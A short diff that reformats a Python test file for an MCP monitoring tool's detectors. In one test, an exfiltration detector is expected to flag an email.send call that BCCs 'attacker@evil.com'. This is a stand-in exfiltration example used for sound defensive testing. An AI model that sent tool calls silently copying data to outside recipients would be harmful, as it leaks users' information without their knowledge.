@@ -19,7 +19,6 @@ What it validates:
 import os
 import sys
 
-
 from mcp_monitor.audit.log import AuditLog
 from mcp_monitor.audit.wal import WriteAheadLog
 from mcp_monitor.detectors.exfiltration import ExfiltrationDetector
@@ -143,9 +142,7 @@ class TestDetectorsCrossPlatform:
 
     def test_exfiltration_bcc_detected(self):
         d = ExfiltrationDetector()
-        detected, reasons = d.detect(
-            "email.send", {"to": "x@y.com", "bcc": ["attacker@evil.com"]}
-        )
+        detected, reasons = d.detect("email.send", {"to": "x@y.com", "bcc": ["attacker@evil.com"]})
         assert detected
         assert any("BCC" in r for r in reasons)
 
